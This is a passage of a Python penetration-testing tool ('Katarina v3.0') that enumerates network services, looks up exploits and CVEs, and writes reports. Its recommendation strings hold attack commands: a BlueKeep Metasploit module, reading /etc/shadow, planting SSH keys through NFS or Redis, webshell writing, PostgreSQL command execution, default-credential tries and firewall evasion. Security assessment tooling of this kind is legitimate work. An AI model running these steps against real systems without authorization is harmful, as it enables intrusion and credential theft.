                    "fact":"VRFY enabled — user enumeration possible",
                    "severity":"HIGH",
                    "next_steps":[
                        f"Enumerate: smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t {target}",
                        "Use found usernames for brute-force on other services (SSH, FTP)",
                    ]})
            if "EXPN" in out:
                enum_results[key]["findings"].append({
                    "fact":"EXPN enabled — mailing list expansion",
                    "severity":"HIGH",
                    "next_steps":[
                        f"Enumerate: smtp-user-enum -M EXPN -U /usr/share/wordlists/metasploit/unix_users.txt -t {target}",
                    ]})

        # ── DNS ──────────────────────────────────────────────
        elif service == "domain" or port == "53":
            out = run_cmd(["nmap","-p",port,"--script",
                           "dns-zone-transfer,dns-recursion,dns-cache-snoop,dns-nsid",
                           "-oN","-",target], verbose)
            enum_results[key] = {"service":"DNS","raw":out[:1000],"findings":[]}
            if "Transfer failed" not in out and len(re.findall(r"dns-zone-transfer", out)) > 0:
                warning(f"  DNS → Zone transfer possible!")
            bind_ver = re.search(r"bind.version:\s*(.+)", out)
            if bind_ver: info(f"  DNS → BIND version: {bind_ver.group(1).strip()}")

            if "Transfer failed" not in out and len(re.findall(r"dns-zone-transfer", out)) > 0:
                enum_results[key]["findings"].append({
                    "fact":"Zone transfer allowed",
                    "severity":"CRITICAL",
                    "next_steps":[
                        f"Dump zone: dig axfr @{target} DOMAIN",
                        "Review all hostnames for internal systems, dev boxes, admin panels",
                    ]})
            if bind_ver:
                ver_str = bind_ver.group(1).strip()
                enum_results[key]["findings"].append({
                    "fact":f"BIND version disclosed: {ver_str}",
                    "severity":"MEDIUM",
                    "next_steps":[
                        f"Search for exploits: searchsploit BIND {ver_str}",
                    ]})

        # ── SNMP ─────────────────────────────────────────────
        elif service == "snmp" or port == "161":
            out = run_cmd(["nmap","-p",port,"--script",
                           "snmp-info,snmp-sysdescr,snmp-processes,snmp-interfaces",
                           "-oN","-",target], verbose)
            enum_results[key] = {"service":"SNMP","raw":out[:1000],"findings":[]}
            if "public" in out.lower(): warning(f"  SNMP → Default community 'public' works!")

            if "public" in out.lower():
                enum_results[key]["findings"].append({
                    "fact":"Default community string 'public' accepted",
                    "severity":"HIGH",
                    "next_steps":[
                        f"Dump everything: snmpwalk -c public -v1 {target}",
                        "Extract users, processes, interfaces, routing tables",
                        f"Try more community strings: onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt {target}",
                    ]})

        # ── RDP ──────────────────────────────────────────────
        elif service in ("ms-wbt-server","rdp") or port == "3389":
            out = run_cmd(["nmap","-p",port,"--script",
                           "rdp-enum-encryption,rdp-vuln-ms12-020",
                           "-oN","-",target], verbose)
            enum_results[key] = {"service":"RDP","raw":out[:800],"findings":[]}
            if "VULNERABLE" in out: warning(f"  RDP → Vulnerability detected!")

            if "VULNERABLE" in out:
                enum_results[key]["findings"].append({
                    "fact":"RDP vulnerability confirmed (MS12-020 / BlueKeep)",
                    "severity":"CRITICAL",
                    "next_steps":[
                        f"Metasploit: use exploit/windows/rdp/cve_2019_0708_bluekeep_rce → set RHOSTS {target}",
                        f"Or: use auxiliary/dos/windows/rdp/ms12_020_maxchannelids → set RHOST {target}",
                    ]})

        # ── MySQL ────────────────────────────────────────────
        elif service == "mysql" or port == "3306":
            out = run_cmd(["nmap","-p",port,"--script",
                           "mysql-info,mysql-empty-password,mysql-databases,mysql-users",
                           "-oN","-",target], verbose)
            enum_results[key] = {"service":"MySQL","raw":out[:1000],"findings":[]}
            if "empty password" in out.lower():
                warning(f"  MySQL → Empty password on root!")
            dbs = re.findall(r"\|\s+(\w[\w_]+)\s*$", out, re.MULTILINE)
            if dbs: info(f"  MySQL → Databases: {', '.join(dbs[:10])}")

            if "empty password" in out.lower():
                enum_results[key]["findings"].append({
                    "fact":"Root login with empty password confirmed",
                    "severity":"CRITICAL",
                    "next_steps":[
                        f"Connect: mysql -h {target} -u root",
                        "Dump databases: SHOW DATABASES; SELECT * FROM mysql.user;",
                        "Check for file read/write: SELECT LOAD_FILE('/etc/passwd');",
                    ]})
            if dbs:
                db_list = ', '.join(dbs[:10])
                enum_results[key]["findings"].append({
                    "fact":f"Databases enumerated: {db_list}",
                    "severity":"MEDIUM",
                    "next_steps":[
                        "Attempt access to each database for sensitive data",
                    ]})

        # ── PostgreSQL ───────────────────────────────────────
        elif service == "postgresql" or port == "5432":
            out = run_cmd(["nmap","-p",port,"--script",
                           "pgsql-brute","-oN","-",target], verbose, timeout=30)
            enum_results[key] = {"service":"PostgreSQL","raw":out[:800],"findings":[]}
            if "Valid credentials" in out: warning(f"  PostgreSQL → Valid credentials found!")

            if "Valid credentials" in out:
                enum_results[key]["findings"].append({
                    "fact":"Valid credentials confirmed",
                    "severity":"CRITICAL",
                    "next_steps":[
                        f"Connect: psql -h {target} -U USERNAME",
                        "List databases: \\l",
                        "Try OS command execution: COPY cmd_exec FROM PROGRAM 'id';",
                    ]})

        # ── RPC / portmapper ─────────────────────────────────
        elif service in ("rpcbind","portmapper") or port == "111":
            rpc_out = run_cmd(["rpcinfo","-p",target], verbose, timeout=15)
            nmap_out = run_cmd(["nmap","-p",port,"--script","rpcinfo,nfs-showmount",
                                "-oN","-",target], verbose)
            rpc_services = []
            for line in rpc_out.splitlines():
                m = re.match(r"\s*(\d+)\s+(\d+)\s+(tcp|udp)\s+(\d+)\s+(\S+)", line)
                if m:
                    prog,vers,proto2,rport,svc_name = m.groups()
                    rpc_services.append({"program":prog,"version":vers,
                                         "proto":proto2,"port":rport,"service":svc_name})

            nfs_exports = []
            nfs_m = re.findall(r"nfs-showmount:\s*\n(?:\|.*\n)*", nmap_out)
            export_lines = re.findall(r"\|\s+(\/\S*)\s+(\S+)", nmap_out)
            if export_lines: nfs_exports = export_lines

            enum_results[key] = {"service":"RPC","rpc_services":rpc_services,
                                 "nfs_exports":nfs_exports,"raw":rpc_out[:1000],"findings":[]}

            if rpc_services:
                info(f"  RPC → {len(rpc_services)} service(s) registered:")
                for rs in rpc_services:
                    info(f"    {rs['port']:>6}/{rs['proto']}  prog:{rs['program']}  {rs['service']}")
            else:
                info(f"  RPC → rpcinfo not available, using nmap script")
                rpc_nmap = re.findall(r"(\d+)\s+(tcp|udp)\s+(nfs|mountd|nlockmgr|portmapper|status|rquotad)\b", nmap_out)
                for r2 in rpc_nmap: info(f"    Port {r2[0]}/{r2[1]}  {r2[2]}")

            if nfs_exports:
                warning(f"  NFS → {len(nfs_exports)} export(s) found!")
                for e in nfs_exports: warning(f"    {e[0]}  accessible by: {e[1]}")
            elif "100003" in rpc_out or "nfs" in rpc_out.lower():
                warning(f"  NFS is running — run: showmount -e {target}")

            for e in nfs_exports:
                if e[1] == "*":
                    enum_results[key]["findings"].append({
                        "fact":f"NFS export world-readable: {e[0]}",
                        "severity":"CRITICAL",
                        "next_steps":[
                            f"Mount: mount -t nfs {target}:{e[0]} /mnt/target",
                            "Read sensitive files: /etc/shadow, SSH keys, config files",
                            f"Write SSH key: cp id_rsa.pub /mnt/target/root/.ssh/authorized_keys",
                        ]})
                else:
                    enum_results[key]["findings"].append({
                        "fact":f"NFS export found: {e[0]} (access: {e[1]})",
                        "severity":"HIGH",
                        "next_steps":[
                            "Check if your IP is in the allowed range",
                            f"Try mounting: mount -t nfs {target}:{e[0]} /mnt/target",
                        ]})
            if not nfs_exports and ("100003" in rpc_out or "nfs" in rpc_out.lower()):
                enum_results[key]["findings"].append({
                    "fact":"NFS service running but exports not enumerated",
                    "severity":"MEDIUM",
                    "next_steps":[
                        f"List manually: showmount -e {target}",
                    ]})
            if rpc_services and not nfs_exports and "100003" not in rpc_out and "nfs" not in rpc_out.lower():
                enum_results[key]["findings"].append({
                    "fact":f"{len(rpc_services)} RPC services registered",
                    "severity":"LOW",
                    "next_steps":[
                        "Review registered services for known vulnerabilities",
                    ]})

        # ── NFS ──────────────────────────────────────────────
        elif service == "nfs" or port == "2049":
            out = run_cmd(["showmount","-e",target], verbose, timeout=15)
            exports = re.findall(r"(/\S+)\s+(\S+)", out)
            enum_results[key] = {"service":"NFS","exports":exports,"raw":out[:800],"findings":[]}
            if exports:
                warning(f"  NFS → {len(exports)} export(s):")
                for e in exports:
                    col = C.RED if e[1] == "*" else C.YELLOW
                    print(f"  {col}  {e[0]}  accessible by: {e[1]}{C.RESET}")
                    if e[1] == "*": warning(f"  NFS → World-readable export! Mount: mount -t nfs {target}:{e[0]} /mnt/target")
            else:
                info(f"  NFS → No exports found or showmount failed")

            for e in exports:
                if e[1] == "*":
                    enum_results[key]["findings"].append({
                        "fact":f"World-readable NFS export: {e[0]}",
                        "severity":"CRITICAL",
                        "next_steps":[
                            f"Mount: mount -t nfs {target}:{e[0]} /mnt/target",
                            "Read sensitive files: /etc/shadow, SSH keys",
                            f"UID spoof: useradd -u TARGET_UID attacker && su attacker",
                        ]})
                else:
                    enum_results[key]["findings"].append({
                        "fact":f"NFS export: {e[0]} (access: {e[1]})",
                        "severity":"HIGH",
                        "next_steps":[
                            "Check if your IP is in the allowed range",
                            f"Try mounting: mount -t nfs {target}:{e[0]} /mnt/target",
                            "If mounted, look for sensitive files and SSH keys",
                        ]})

        # ── Telnet ───────────────────────────────────────────
        elif service == "telnet" or port == "23":
            out = run_cmd(["nmap","-p",port,"--script","telnet-ntlm-info,telnet-encryption",
                           "-oN","-",target], verbose)
            enum_results[key] = {"service":"Telnet","raw":out[:800],"findings":[]}
            warning(f"  Telnet → CLEARTEXT protocol — credentials transmitted in plain text!")

            enum_results[key]["findings"].append({
                "fact":"Cleartext protocol — credentials sent in plain text",
                "severity":"HIGH",
                "next_steps":[
                    f"Connect: telnet {target}",
                    "Try defaults: root:root, admin:admin, admin:password",
                    f"If on same network: sniff creds with tcpdump -i eth0 -A port 23",
                ]})

        # ── VNC ──────────────────────────────────────────────
        elif service == "vnc" or port == "5900":
            out = run_cmd(["nmap","-p",port,"--script","vnc-info,vnc-brute",
                           "-oN","-",target], verbose, timeout=30)
            enum_results[key] = {"service":"VNC","raw":out[:800],"findings":[]}
            if "Valid credentials" in out: warning(f"  VNC → Valid credentials found!")
            if "None" in out: warning(f"  VNC → No authentication required!")

            if "None" in out:
                enum_results[key]["findings"].append({
                    "fact":"No authentication required",
                    "severity":"CRITICAL",
                    "next_steps":[
                        f"Connect: vncviewer {target}::5900",
                    ]})
            elif "Valid credentials" in out:
                enum_results[key]["findings"].append({
                    "fact":"Valid credentials confirmed",
                    "severity":"CRITICAL",
                    "next_steps":[
                        f"Connect: vncviewer {target}::5900 with found password",
                    ]})

        # ── Redis ────────────────────────────────────────────
        elif service == "redis" or port == "6379":
            out = run_cmd(["nmap","-p",port,"--script","redis-info","-oN","-",target], verbose)
            enum_results[key] = {"service":"Redis","raw":out[:800],"findings":[]}
            if "connected_clients" in out: warning(f"  Redis → Unauthenticated access!")

            if "connected_clients" in out:
                enum_results[key]["findings"].append({
                    "fact":"Unauthenticated access confirmed",
                    "severity":"CRITICAL",
                    "next_steps":[
                        f"Connect: redis-cli -h {target}",
                        "Dump data: KEYS *",
                        f"Write SSH key: redis-cli -h {target} CONFIG SET dir /root/.ssh/ then write authorized_keys",
                        "Write webshell if web root is known",
                    ]})

        else:
            info(f"  No specific module for {friendly} on {key}")
            enum_results[key] = {"service":friendly,"raw":"","findings":[]}

    return enum_results

# ─────────────────────────────────────────────
#  VULN SEARCH HELPERS
# ─────────────────────────────────────────────
def parse_banner_components(product, version, extra):
    """Split a service banner into individual (product, version) components.

    Handles two nmap output styles:
      Structured:  product="Apache httpd"  version="1.3.20"
                   extra="(Unix) mod_ssl/2.8.4 OpenSSL/0.9.6b"
      Compound:    product="Apache/1.3.20 (Unix) mod_ssl/2.8.4 OpenSSL/0.9.6b"
                   version=""  extra=""

    Returns: [("Apache httpd", "1.3.20"), ("mod_ssl", "2.8.4"), ("OpenSSL", "0.9.6b")]
    """
    _COMP_RE = r"(\S+?)/([\d][\d.]*\w*)"
    components = []

    if product:
        cleaned_prod = re.sub(r"\([^)]*\)", " ", product)
        prod_parts = re.findall(_COMP_RE, cleaned_prod)
        if prod_parts:
            seen = set()
            for name, ver in prod_parts:
                key = name.lower()
                if key not in seen:
                    seen.add(key)
                    components.append((name, ver))
        else:
            components.append((product.strip(), (version or "").strip()))

    if extra:
        cleaned_extra = re.sub(r"\([^)]*\)", " ", extra)
        existing = {c[0].lower() for c in components}
        for m in re.finditer(_COMP_RE, cleaned_extra):
            name, ver = m.group(1), m.group(2)
            if name.lower() not in existing:
                existing.add(name.lower())
                components.append((name, ver))

    return components if components else [(product or "", version or "")]

def filter_exploits_by_relevance(results, query_product):
    """Drop exploit results where the product name doesn't appear in the title."""
    if not query_product:
        return results
    words = [w.lower() for w in query_product.split() if len(w) > 2]
    if not words:
        return results
    filtered = []
    for line in results:
        title = line.split("|")[0].lower() if "|" in line else line.lower()
        if any(w in title for w in words):
            filtered.append(line)
    return filtered

def find_searchsploit():
    for p in ["/usr/bin/searchsploit","/usr/local/bin/searchsploit",
              "/opt/exploitdb/searchsploit"]:
        if os.path.exists(p): return p
    out = run_cmd(["which","searchsploit"])
    return out.strip() if out.strip() else None

def run_searchsploit(ss_path, query, version="", verbose=False):
    """Run searchsploit safely — no unsupported flags"""
    if not ss_path: return []
    search_term = f"{query} {version}".strip()
    out = run_cmd([ss_path, search_term], verbose, timeout=30)
    results = []
    for line in out.splitlines():
        line = line.strip()
        if not line: continue
        skip_words = ["----","Exploit Title","No Results","Usage","=====",
                      "E-DB","searchsploit","Options","illegal","option","error"]
        if any(w in line for w in skip_words): continue
        if "|" in line and len(line) > 15:
            results.append(line)
    return results[:15]

def search_exploitdb_csv(query, version=""):
    """Search local ExploitDB CSV directly"""
    csv_paths = ["/usr/share/exploitdb/files_exploits.csv",
                 "/opt/exploitdb/files_exploits.csv"]
    results = []
    for csv_path in csv_paths:
        if not os.path.exists(csv_path): continue
        try:
            import csv
            terms = [t.lower() for t in (query+" "+version).split() if len(t) > 2]
            with open(csv_path, encoding="utf-8", errors="ignore") as f:
                reader = csv.reader(f)
                next(reader, None)
                for row in reader:
                    if len(row) < 3: continue
                    title = row[2].lower()
                    if all(t in title for t in terms):
                        results.append(f"{row[2]} | {row[1]}")
                    if len(results) >= 15: break
        except: pass
        break
    return results

def search_nmap_vulns(target, port, verbose=False):
    """nmap vuln scripts"""
    out = run_cmd(["nmap","-p",port,"--script","vuln","--host-timeout","120s","-n",target],
                  verbose, timeout=150)
    cves  = list(set(re.findall(r"CVE-\d{4}-\d+", out)))
    vulns = []
    for m in re.finditer(r"\|\s+VULNERABLE:(.*?)(?=\n\|[^\s]|\Z)", out, re.DOTALL):
        block = m.group(0).strip()
        name  = re.search(r"\|\s+(.+?)\s*$", block.split("\n")[0], re.MULTILINE)
        if name: vulns.append(name.group(1).strip())
    return cves, vulns, out[:1500]

def search_cve_online(query, version=""):
    """NVD API lookup"""
    try:
        import urllib.request, urllib.parse
        search = urllib.parse.quote(f"{query} {version}".strip())
        url = f"https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch={search}&resultsPerPage=5"
        req = urllib.request.Request(url, headers={"User-Agent":"Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=8) as resp:
            data = json.loads(resp.read().decode())
            results = []
            for item in data.get("vulnerabilities",[]):
                cve_id = item.get("cve",{}).get("id","")
                desc   = item.get("cve",{}).get("descriptions",[{}])[0].get("value","")[:120]
                score  = ""
                for k in ["cvssMetricV31","cvssMetricV30","cvssMetricV2"]:
                    m = item.get("cve",{}).get("metrics",{}).get(k)
                    if m:
                        score = m[0].get("cvssData",{}).get("baseScore","")
                        break
                if cve_id: results.append(f"{cve_id} (CVSS:{score}) — {desc}")
            return results
    except: return []

# ─────────────────────────────────────────────
#  PHASE 5 — VULNERABILITY SEARCH
# ─────────────────────────────────────────────
def phase_vuln_search(services, verbose):
    section("PHASE 5 — Vulnerability Search")
    ss_path      = find_searchsploit()
    vuln_results = []

    SKIP_GENERIC = {"status","rpc","portmapper","rpcbind"}

    for svc in services:
        product = svc.get("product","").strip()
        version = svc.get("version","").strip()
        extra   = svc.get("extra","").strip()
        service = svc.get("raw_service","").strip().lower()
        port    = svc.get("port","")
        proto   = svc.get("proto","")
        target  = svc.get("target","")

        base_query = product if product else service
        if not base_query or base_query.lower() in SKIP_GENERIC:
            if target:
                cves_nmap, vulns_nmap, nmap_raw = search_nmap_vulns(target, port, verbose)
                vuln_results.append({"port":port,"proto":proto,"service":service,
                    "product":product,"version":version,
                    "exploits":[],"cves":cves_nmap,"nmap_vulns":vulns_nmap,"nmap_raw":nmap_raw})
                if cves_nmap: warning(f"  [{port}/{proto}] nmap vuln CVEs: {', '.join(cves_nmap)}")
            continue

        entry = {"port":port,"proto":proto,"service":service,"product":product,
                 "version":version,"exploits":[],"cves":[],"nmap_vulns":[],"nmap_raw":""}

        components = parse_banner_components(product, version, extra)
        seen_exploits = set()

        for comp_product, comp_version in components:
            if not comp_product:
                continue
            info(f"[{port}/{proto}] Searching: {comp_product} {comp_version}")

            # 1. searchsploit
            ss_results = run_searchsploit(ss_path, comp_product, comp_version, verbose)
            if not ss_results:
                ss_results = search_exploitdb_csv(comp_product, comp_version)

            ss_results = filter_exploits_by_relevance(ss_results, comp_product)

            for ex in ss_results:
                path_part = ex.split("|")[-1].strip().lower() if "|" in ex else ex.strip().lower()
                if path_part not in seen_exploits:
                    seen_exploits.add(path_part)
                    entry["exploits"].append(ex)

            if ss_results:
                warning(f"  [{comp_product}] Exploits → {len(ss_results)} found")
                for ex in ss_results[:5]:
                    parts = [p.strip() for p in ex.split("|")]
                    print(f"    {C.RED}→{C.RESET} {parts[0]}")
                    if len(parts) > 1: print(f"      {C.DIM}{parts[-1]}{C.RESET}")
            else:
                info(f"  [{comp_product}] No exploit DB results")

            # 2. NVD CVE lookup
            info(f"  [{comp_product}] NVD lookup")
            cve_results = search_cve_online(comp_product, comp_version)
            if cve_results:
                existing_ids = {c.split()[0] for c in entry["cves"]}
                for c in cve_results:
                    if c.split()[0] not in existing_ids:
                        entry["cves"].append(c)
                warning(f"  [{comp_product}] NVD → {len(cve_results)} CVE(s)")
                for c in cve_results[:3]: print(f"    {C.RED}CVE:{C.RESET} {c}")
            else:
                info(f"  [{comp_product}] NVD → No results")

        # 3. nmap vuln scripts (once per port, not per component)
        if target:
            cves_nmap, vulns_nmap, nmap_raw = search_nmap_vulns(target, port, verbose)
            entry["nmap_vulns"] = vulns_nmap
            entry["nmap_raw"]   = nmap_raw
            existing_ids = {c.split()[0] for c in entry["cves"]}
            for cve in cves_nmap:
                if cve not in existing_ids:
                    entry["cves"].append(cve)
            if cves_nmap: warning(f"  nmap vuln CVEs: {', '.join(cves_nmap)}")
            if vulns_nmap:
                warning(f"  nmap vuln → {len(vulns_nmap)} finding(s)")
                for v in vulns_nmap[:3]: print(f"    {C.RED}!{C.RESET} {v}")

        entry["exploits"] = entry["exploits"][:20]
        vuln_results.append(entry)

    return vuln_results

# ─────────────────────────────────────────────
#  PHASE 6 — RECOMMENDATIONS
# ─────────────────────────────────────────────
def phase_recommendations(services, vuln_results, fw_analysis, enum_results):
    section("PHASE 6 — Recommendations & Next Steps")
    recs = []
    seen_facts = set()

    if fw_analysis.get("skipped"):
        recs.append({"priority":"INFO","title":"Firewall Analysis Skipped",
            "detail":"ACK/Window scans require root/sudo\n"
                     "Re-run with sudo for firewall detection"})
    elif fw_analysis.get("firewall_detected"):
        detail = ("Try fragmented packets: nmap -f\n"
                  "Try decoys: nmap -D RND:10\n"
                  "Try source port: nmap --source-port 53")
        win_open = fw_analysis.get("window_open", [])
        if win_open:
            detail += f"\nWindow scan revealed open ports behind firewall: {', '.join(win_open[:10])}"
        recs.append({"priority":"INFO","title":"Firewall Detected","detail":detail})

    # Generic findings-driven recommendations from Phase 4
    for svc in services:
        port = svc["port"]
        proto = svc["proto"]
        prod = svc.get("product","")
        v    = svc.get("version","")
        key  = f"{port}/{proto}"
        enum = enum_results.get(key, {})
        svc_name = enum.get("service", svc.get("service", "Unknown"))
        findings = enum.get("findings", [])

        for finding in findings:
            fact = finding["fact"]
            if fact in seen_facts:
                continue
            seen_facts.add(fact)

            detail_lines = []
            for i, step in enumerate(finding["next_steps"], 1):
                detail_lines.append(f"[{i}] {step}")

            recs.append({
                "priority": finding["severity"],
                "title": f"{svc_name} on port {port} — {fact}",
                "detail": "\n".join(detail_lines),
            })

        if not findings:
            version_info = f"{prod} {v}".strip()
            recs.append({
                "priority": "LOW",
                "title": f"{svc_name} on port {port} — no specific findings",
                "detail": f"[1] Check version: searchsploit {version_info}" if version_info else "[1] No version info available — manual investigation needed",
            })

    # Vuln-based recs from Phase 5 (already finding-driven)
    for v in vuln_results:
        total = len(v["exploits"]) + len(v["cves"]) + len(v["nmap_vulns"])
        if total > 0:
            lines = [f"Port {v['port']}/{v['proto']} — {v['product'] or v['service']} {v['version']}"]
            if v["exploits"]:
                lines.append(f"Exploits ({len(v['exploits'])}):")
                for ex in v["exploits"][:8]:
                    parts = [p.strip() for p in ex.split("|")]
                    lines.append(f"  → {parts[0]}")
                    if len(parts)>1: lines.append(f"    Path: {parts[-1]}")
            if v["cves"]:
                lines.append(f"CVEs ({len(v['cves'])}):")
                for c in v["cves"][:5]: lines.append(f"  → {c}")
            if v["nmap_vulns"]:
                lines.append("nmap vuln findings:")
                for n in v["nmap_vulns"][:3]: lines.append(f"  ! {n}")
            lines.append(f"Next step: searchsploit -x <path> → test in Metasploit or manually")
            recs.append({"priority":"CRITICAL",
                "title":f"Active Vulnerabilities — {v['product'] or v['service']} port {v['port']}",
                "detail":"\n".join(lines)})

    if not recs:
        recs.append({"priority":"INFO","title":"No immediate attack vectors found",
            "detail":"Try: full port scan (-p all), credential brute-force, web fuzzing"})

    order  = {"CRITICAL":0,"HIGH":1,"MEDIUM":2,"LOW":3,"INFO":4}
    colors = {"CRITICAL":C.RED,"HIGH":C.YELLOW,"MEDIUM":C.CYAN,"LOW":C.GREEN,"INFO":C.WHITE}
    recs.sort(key=lambda x: order.get(x["priority"],9))

    for r in recs:
        col = colors.get(r["priority"],C.WHITE)
        print(f"\n  {col}[{r['priority']}]{C.RESET} {C.BOLD}{r['title']}{C.RESET}")
        for line in r["detail"].split("\n"):
            print(f"         {C.DIM}{line}{C.RESET}")

    return recs

# ─────────────────────────────────────────────
#  PHASE 7 — SCAN METADATA (no attacker info)
# ─────────────────────────────────────────────
def phase_metadata(target, args, start_time, port_results, services):
    section("PHASE 7 — Scan Metadata")
    end_time = time.time()
    duration = end_time - start_time
    meta = {
        "tool":           "Katarina v3.0",
        "target":         target,
        "scan_start":     datetime.datetime.fromtimestamp(start_time).strftime("%Y-%m-%d %H:%M:%S"),
        "scan_end":       datetime.datetime.fromtimestamp(end_time).strftime("%Y-%m-%d %H:%M:%S"),
        "duration":       f"{int(duration//60)}m {int(duration%60)}s",
        "ports_arg":      args.ports,
        "scan_type":      args.scan,
        "timing":         args.timing,
        "output_file":    args.output or "terminal only",
        "total_tcp":      len(port_results.get("tcp",[])),
        "total_udp":      len(port_results.get("udp",[])),
        "total_services": len(services),
    }
    for k,v in meta.items():
        print(f"  {C.CYAN}{k:<16}{C.RESET}: {v}")
    return meta

# ─────────────────────────────────────────────
#  REPORT GENERATION
# ─────────────────────────────────────────────
def generate_txt_report(data, filepath):
    sep  = "="*62
    sep2 = "-"*62
    lines = [sep,"  KATARINA v3.0 — Penetration Testing Report  |  by MTM",sep,
             f"  Target      : {data['target']}",
             f"  Date        : {data['timestamp']}",
             f"  Scan Type   : {data['scan_type'].upper()}",
             f"  Ports       : {data['ports']}",
             f"  Timing      : {data['timing']}",
             f"  Duration    : {data['meta'].get('duration','N/A')}",
             sep,"",
             "[PHASE 0] HOST DISCOVERY",sep2]
    hd = data["host_discovery"]
    lines += [f"  Status      : {'UP' if hd['alive'] else 'DOWN'}",
              f"  Hostname    : {hd['hostname']}",f"  TTL         : {hd['ttl']}",
              f"  OS Family   : {hd['os_family']}",f"  OS Detected : {hd['os_name']}",
              f"  OS Accuracy : {hd['os_accuracy']}",f"  CPE         : {hd['os_cpe']}",
              "","[PHASE 1] OPEN PORTS",sep2]
    for p in data["port_results"].get("tcp",[]): lines.append(f"  {p['port']:>5}/tcp   {p['service']}")
    for p in data["port_results"].get("udp",[]): lines.append(f"  {p['port']:>5}/udp   {p['service']}")

    lines += ["","[PHASE 2] FIREWALL",sep2]
    fw = data["firewall"]
    if fw.get("skipped"):
        lines.append("  Firewall    : SKIPPED (requires root/sudo)")
    else:
        lines.append(f"  Firewall    : {'DETECTED' if fw['firewall_detected'] else 'NOT DETECTED'}")
    if fw["filtered_ports"]: lines.append(f"  Filtered    : {', '.join(fw['filtered_ports'][:15])}")
    if fw.get("unfiltered_ports"): lines.append(f"  Unfiltered  : {len(fw['unfiltered_ports'])} port(s)")
    if fw.get("window_open"): lines.append(f"  Open (Window): {', '.join(fw['window_open'][:15])}")
    for note in fw.get("notes",[]): lines.append(f"  Note        : {note}")

    lines += ["","[PHASE 3] SERVICES",sep2]
    for s in data["services"]:
        lines.append(f"  {s['port']:>5}/{s['proto']}  {s['product'] or s['service']} {s['version']}")

    lines += ["","[PHASE 4] ENUMERATION FINDINGS",sep2]
    for key, er in data.get("enum_results",{}).items():
        svc_name = er.get("service","")
        lines.append(f"\n  [{key}] {svc_name}")
        if svc_name == "FTP":
            lines.append(f"  Anonymous login: {er.get('anonymous','N/A')}")
            for f in er.get("files",[])[:10]: lines.append(f"    {f}")
        elif svc_name == "SMB":
            lines.append(f"  Null session: {er.get('null_session','N/A')}")
            for s in er.get("shares",[])[:10]: lines.append(f"    Share: {s}")
            for u in er.get("users",[])[:20]: lines.append(f"    User: {u}")
        elif svc_name == "NFS":
            for e in er.get("exports",[]): lines.append(f"    Export: {e[0]} → {e[1]}")
        elif svc_name == "RPC":
            for rs in er.get("rpc_services",[]): lines.append(f"    {rs['port']}/{rs['proto']}  {rs['service']}")
            for e in er.get("nfs_exports",[]): lines.append(f"    NFS Export: {e[0]} → {e[1]}")

    lines += ["","[PHASE 5] VULNERABILITIES",sep2]
    for v in data["vulns"]:
        lines.append(f"\n  Port {v['port']}/{v['proto']} — {v['product'] or v['service']} {v['version']}")
        if v["exploits"]:
            lines.append(f"  Exploits ({len(v['exploits'])}):")
            for ex in v["exploits"][:10]:
                parts = [p.strip() for p in ex.split("|")]
                lines.append(f"    → {parts[0]}")
                if len(parts)>1: lines.append(f"      {parts[-1]}")
        if v["cves"]:
            lines.append(f"  CVEs ({len(v['cves'])}):")
            for c in v["cves"]: lines.append(f"    → {c}")
        if v["nmap_vulns"]:
            lines.append("  nmap vuln:")
            for n in v["nmap_vulns"]: lines.append(f"    ! {n}")
        if not any([v["exploits"],v["cves"],v["nmap_vulns"]]):
            lines.append("  No known exploits found")

    lines += ["","[PHASE 6] RECOMMENDATIONS & NEXT STEPS",sep2]
    for r in data["recommendations"]:
        lines += [f"\n  [{r['priority']}] {r['title']}"]
        for line in r["detail"].split("\n"): lines.append(f"  {line}")

    lines += ["","[PHASE 7] SCAN METADATA",sep2]
    for k,v in data["meta"].items(): lines.append(f"  {k:<16}: {v}")
    lines += ["",sep,"  End of Report — Katarina v3.0 by MTM",sep]

    Path(filepath).write_text("\n".join(lines))
    success(f"TXT report saved: {filepath}")

def generate_html_report(data, filepath):
    pri_col = {"CRITICAL":"#e74c3c","HIGH":"#e67e22","MEDIUM":"#f1c40f","LOW":"#2ecc71","INFO":"#3498db"}
    tcp_rows = "".join(f"<tr><td>{p['port']}/tcp</td><td>{p['service']}</td></tr>" for p in data["port_results"].get("tcp",[]))
    udp_rows = "".join(f"<tr><td>{p['port']}/udp</td><td>{p['service']}</td></tr>" for p in data["port_results"].get("udp",[]))
    svc_rows = "".join(f"<tr><td>{s['port']}/{s['proto']}</td><td>{s['service']}</td><td>{s['product']}</td><td>{s['version']}</td></tr>" for s in data["services"])

    # Enumeration findings
    enum_html = ""
    for key, er in data.get("enum_results",{}).items():
        svc_name = er.get("service","")
        items = ""
        if svc_name == "FTP":
            anon = er.get("anonymous","N/A")
            col  = "#e74c3c" if anon=="ALLOWED" else "#2ecc71"
            items += f"<p>Anonymous login: <b style='color:{col}'>{anon}</b></p>"
            for f in er.get("files",[])[:10]: items += f"<code>{f}</code><br>"
        elif svc_name == "SMB":
            items += f"<p>Null session: <b>{er.get('null_session','N/A')}</b></p>"
            for s in er.get("shares",[])[:10]: items += f"<p>Share: {s}</p>"
            for u in er.get("users",[])[:20]: items += f"<p>User: {u}</p>"
            if er.get("smbclient"): items += f"<pre style='color:#aaa;font-size:.8em'>{er['smbclient'][:400]}</pre>"
        elif svc_name == "NFS":
            for e in er.get("exports",[]): items += f"<p style='color:#e74c3c'>Export: {e[0]} → <b>{e[1]}</b></p>"
        elif svc_name == "RPC":
            for rs in er.get("rpc_services",[]): items += f"<p>{rs['port']}/{rs['proto']} — {rs['service']}</p>"
            for e in er.get("nfs_exports",[]): items += f"<p style='color:#e74c3c'>NFS: {e[0]} → {e[1]}</p>"
        if items:
            enum_html += f"<div class='vuln-block'><h4>[{key}] {svc_name}</h4>{items}</div>"

    vuln_sec = ""
    for v in data["vulns"]:
        items = ""
        for ex in v["exploits"][:10]:
            parts = [p.strip() for p in ex.split("|")]
            path  = parts[-1] if len(parts)>1 else ""
            items += f"<li><b>{parts[0]}</b><br><small style='color:#888'>{path}</small></li>"
        for cve in v["cves"]:
            items += f"<li class='cve'>{cve}</li>"
        for nv in v["nmap_vulns"]:
            items += f"<li style='color:#e67e22'>VULN: {nv}</li>"
        if items:
            vuln_sec += f"""<div class="vuln-block">
              <h4>Port {v['port']}/{v['proto']} — {v['product'] or v['service']} {v['version']}</h4>
              <ul>{items}</ul></div>"""
        else:
